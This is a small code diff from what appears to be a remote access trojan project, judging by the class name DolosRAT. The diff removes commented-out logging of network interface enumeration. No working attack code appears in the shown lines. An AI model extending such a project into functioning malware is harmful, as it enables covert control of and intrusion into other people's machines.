@@ -126,14 +126,6 @@ class DolosRAT:
         """
         self._net_wrapper = get_ifa_wrapper(self._logger)
 
-        # count = self._network_wrapper.get_ifas_count()
-        # default = self._network_wrapper.get_selected_ifa().ifa_name
-
-        # self._logger.write_log(
-        #     f"Enumerated { count } interfaces. Default: \'{ default }\'.", 
-        #     LoggerLevel.INFO
-        # )
-
     def _run(self: object) -> None:
         """Officially starts the internal modules.
 
